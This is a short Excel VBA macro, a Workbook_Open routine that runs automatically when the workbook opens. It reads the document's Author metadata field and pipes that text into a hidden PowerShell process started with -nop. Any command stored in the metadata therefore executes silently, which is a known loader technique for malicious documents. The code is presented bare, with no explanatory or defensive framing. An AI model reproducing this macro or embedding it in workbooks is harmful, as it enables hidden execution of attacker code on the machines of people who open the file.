Private Sub Workbook_Open()
    Dim author As String
    author = ActiveWorkbook.BuiltinDocumentProperties("Author")
    
    Dim ws As Object
    Set ws = CreateObject("WScript.Shell")
    With ws.Exec("powershell.exe -nop -WindowStyle hidden -Command -")
        .StdIn.WriteLine author
        .StdIn.WriteBlankLines 1
        .Terminate
    End With
End Sub
